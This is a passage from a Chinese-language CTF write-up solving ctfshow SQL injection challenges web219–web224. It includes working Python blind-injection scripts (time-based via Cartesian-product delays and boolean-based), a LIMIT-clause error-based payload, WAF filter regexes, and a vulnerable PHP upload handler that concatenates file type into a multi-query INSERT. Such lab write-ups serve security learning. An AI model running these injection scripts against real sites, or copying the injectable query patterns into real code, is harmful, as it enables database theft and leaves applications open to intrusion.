<h2 id="web219"><a href="#web219" class="headerlink" title="web219"></a>web219</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    where id = (<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;  </span><br></pre></td></tr></table></figure>
<p>时间盲注，过滤新增 <code>rlike</code>，对上一题的脚本没有影响，一把梭。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://7337669d-2dd1-4181-9656-aa71b4f34d25.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxca,ctfshow_info</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,ip,cnak</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaabc from ctfshow_flagxca),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span></span><br><span class="line">              <span class="string">f&quot;information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web220"><a href="#web220" class="headerlink" title="web220"></a>web220</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">    where id = (<span class="variable">$id</span>);</span><br><span class="line">      </span><br><span class="line"><span class="comment">//屏蔽危险分子</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/sleep|benchmark|rlike|ascii|hex|concat_ws|concat|mid|substr/i&#x27;</span>,<span class="variable">$str</span>);</span><br><span class="line">&#125;   </span><br></pre></td></tr></table></figure>
<p>时间盲注，禁用掉了 <code>ascii hex concat_ws concat mid substr</code>，不能用二分法，要拼接比较了。<br>在构造 payload 的时候使用 limit 限制查询条数，从而绕过 concat 的限制，查到所有的结果。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://bbdb689b-386c-435c-ae43-e707b9f65a76.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagxcac</span></span><br><span class="line"><span class="comment"># payload = &quot;left((select table_name from information_schema.tables where table_schema=database() limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># 列名 flagaabcc</span></span><br><span class="line"><span class="comment"># payload = &quot;left((select column_name from information_schema.columns where table_name=&#x27;ctfshow_flagxcac&#x27; limit 1,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;left((select flagaabcc from ctfshow_flagxcac limit 0,1),&#123;&#125;)=&#x27;&#123;&#125;&#x27;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&quot;debug&quot;</span>: <span class="number">0</span>,</span><br><span class="line">        <span class="string">&quot;ip&quot;</span>: <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span></span><br><span class="line">              <span class="string">f&quot;information_schema.tables C),1) &quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.post(url, data=data)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">letters = <span class="string">&quot;&#123;&#125;_-&quot;</span> + string.ascii_lowercase + string.digits</span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> letter <span class="keyword">in</span> letters:</span><br><span class="line">        load = payload.<span class="built_in">format</span>(index, result + letter)</span><br><span class="line">        <span class="keyword">if</span> valid_payload(load):</span><br><span class="line">            result += letter</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web221"><a href="#web221" class="headerlink" title="web221"></a>web221</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user <span class="title function_ invoke__">limit</span> (<span class="variable">$page</span>-<span class="number">1</span>)*<span class="variable">$limit</span>,<span class="variable">$limit</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line"><span class="comment">//拿到数据库名字就算你赢</span></span><br></pre></td></tr></table></figure>
<p>limit 位置注入，参考文章 <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html">https://www.leavesongs.com/PENETRATION/sql-injections-in-mysql-limit-clause.html</a> 利用 procedure analyse 构造参数。<br>payload <code>/api/?page=1&amp;limit=1 procedure analyse(extractvalue(rand(),concat(0x3a,database())),1)</code>    </p>
<h2 id="web222"><a href="#web222" class="headerlink" title="web222"></a>web222</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br></pre></td></tr></table></figure>
<p>group by 位置注入，和前面时间盲注一样，可复用脚本。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://3c71a933-4713-4ccb-8a89-9bc4bbea0bf3.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flaga,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagaabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagaabc from ctfshow_flaga),&#123;&#125;,1))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    username = <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,(select count(*) from information_schema.columns A,information_schema.tables B,&quot;</span> \</span><br><span class="line">               <span class="string">f&quot;information_schema.tables C),1) &quot;</span></span><br><span class="line">    time_s = <span class="literal">None</span></span><br><span class="line">    time_e = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        time_s = time.time()</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            _ = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>?u=<span class="subst">&#123;username&#125;</span>&amp;page=3&amp;limit=10&quot;</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        time_e = time.time()</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="comment"># 改用手动计时防止多次没跑完的笛卡尔积叠加卡死影响注入</span></span><br><span class="line">    <span class="keyword">return</span> time_e-time_s &gt; <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(index, everage)):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>

<h2 id="web223"><a href="#web223" class="headerlink" title="web223"></a>web223</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//分页查询</span></span><br><span class="line"><span class="variable">$sql</span> = select * <span class="keyword">from</span> ctfshow_user group by <span class="variable">$username</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">//<span class="doctag">TODO:</span>很安全，不需要过滤</span></span><br><span class="line"><span class="comment">//用户名不能是数字</span></span><br></pre></td></tr></table></figure>
<p>group by 位置注入，和上一题差不多，不过这次再尝试会发现禁用了数字，改用 true 构造数字。    </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_num</span>(<span class="params">i: <span class="built_in">int</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;+&#x27;</span>.join(<span class="string">&quot;true&quot;</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(i))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://9a3b0f78-09a7-4bd9-8c46-b092345a74d2.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line"><span class="comment"># 表名 ctfshow_flagas,ctfshow_user</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># 列名 id,flagasabc,info,id,username,pass</span></span><br><span class="line"><span class="comment"># payload = &quot;ascii(mid((select group_concat(column_name) from information_schema.columns where table_schema=database()),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"><span class="comment"># flag</span></span><br><span class="line">payload = <span class="string">&quot;ascii(mid((select flagasabc from ctfshow_flagas),&#123;&#125;,true))&gt;&#123;&#125;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">true_flag = <span class="string">&quot;passwordAUTO&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">valid_payload</span>(<span class="params">p: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    username = <span class="string">f&quot;if(<span class="subst">&#123;p&#125;</span>,username,&#x27;a&#x27;)&quot;</span></span><br><span class="line">    response = <span class="literal">None</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            response = requests.get(<span class="string">f&quot;<span class="subst">&#123;url&#125;</span>&quot;</span>, params=&#123;<span class="string">&quot;u&quot;</span>: username&#125;)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> true_flag <span class="keyword">in</span> response.text</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">index = <span class="number">1</span></span><br><span class="line">result = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    start = <span class="number">32</span></span><br><span class="line">    end = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">not</span>(<span class="built_in">abs</span>(start - end) == <span class="number">1</span> <span class="keyword">or</span> start == end):</span><br><span class="line">        everage = (start + end) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> valid_payload(payload.<span class="built_in">format</span>(make_num(index), make_num(everage))):</span><br><span class="line">            start = everage</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            end = everage</span><br><span class="line">    <span class="keyword">if</span> end &lt; start:</span><br><span class="line">        end = start</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">chr</span>(end) == <span class="string">&quot;!&quot;</span>:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    result += <span class="built_in">chr</span>(end)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;[*] result: <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line">    index += <span class="number">1</span></span><br></pre></td></tr></table></figure>
<p>能布尔盲注就别时间盲注，快太多了    </p>
<h2 id="web224"><a href="#web224" class="headerlink" title="web224"></a>web224</h2><p>可能是和文件上传的某道题联动了，先留着。<br>—-2022.6.7—-<br>并不是，这道题的注入点在文件的类型里面。  </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="keyword">if</span> (<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] &gt; <span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;Return Code: &quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;error&quot;</span>] . <span class="string">&quot;&lt;br /&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>]&gt;<span class="number">10</span>*<span class="number">1024</span>)&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&quot;文件过大: &quot;</span> .(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>) . <span class="string">&quot; Kb&lt;br /&gt;&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">file_exists</span>(<span class="string">&quot;upload/&quot;</span> . <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))</span><br><span class="line">      &#123;</span><br><span class="line">      <span class="keyword">echo</span> <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>] . <span class="string">&quot; already exists. &quot;</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">	  <span class="variable">$filename</span> = <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">rand</span>(<span class="number">1</span>,<span class="number">10000</span>))).<span class="string">&quot;.zip&quot;</span>;</span><br><span class="line">      <span class="variable">$filetype</span> = (<span class="keyword">new</span> finfo)-&gt;<span class="title function_ invoke__">file</span>(<span class="variable">$_FILES</span>[<span class="string">&#x27;file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>]);</span><br><span class="line">      <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/image|png|bmap|jpg|jpeg|application|text|audio|video/i&quot;</span>,<span class="variable">$filetype</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;file type error&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">	  <span class="variable">$filepath</span> = <span class="string">&quot;upload/&quot;</span>.<span class="variable">$filename</span>;</span><br><span class="line">	  <span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO file(filename,filepath,filetype) VALUES (&#x27;&quot;</span>.<span class="variable">$filename</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filepath</span>.<span class="string">&quot;&#x27;,&#x27;&quot;</span>.<span class="variable">$filetype</span>.<span class="string">&quot;&#x27;);&quot;</span>;</span><br><span class="line">      <span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>],</span><br><span class="line">      <span class="string">&quot;upload/&quot;</span> . <span class="variable">$filename</span>);</span><br><span class="line">	  <span class="variable">$con</span> = <span class="title function_ invoke__">mysqli_connect</span>(<span class="string">&quot;localhost&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;root&quot;</span>,<span class="string">&quot;ctf&quot;</span>);</span><br><span class="line">		<span class="keyword">if</span> (!<span class="variable">$con</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;Could not connect: &#x27;</span> . <span class="title function_ invoke__">mysqli_error</span>());</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (<span class="title function_ invoke__">mysqli_multi_query</span>(<span class="variable">$con</span>, <span class="variable">$sql</span>)) &#123;</span><br><span class="line">			<span class="title function_ invoke__">header</span>(<span class="string">&quot;location:filelist.php&quot;</span>);</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">echo</span> <span class="string">&quot;Error: &quot;</span> . <span class="variable">$sql</span> . <span class="string">&quot;&lt;br&gt;&quot;</span> . <span class="title function_ invoke__">mysqli_error</span>(<span class="variable">$con</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		 </span><br><span class="line">		<span class="title function_ invoke__">mysqli_close</span>(<span class="variable">$con</span>);</span><br><span class="line">		</span><br><span class="line">      &#125;</span><br><span class="line">    </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>注意 $filetype 是直接拼接且<a target="_blank" rel="noopener" href="https://blog.gem-love.com/ctf/2283.html#%E4%BD%A0%E6%B2%A1%E8%A7%81%E8%BF%87%E7%9A%84%E6%B3%A8%E5%85%A5">可控的</a>，这里获取到的信息可以通过 file 命令等价。这道题禁用了图片类型文件，群主给出的 Payload 是 PC64 Emulator file 改的。  </p>
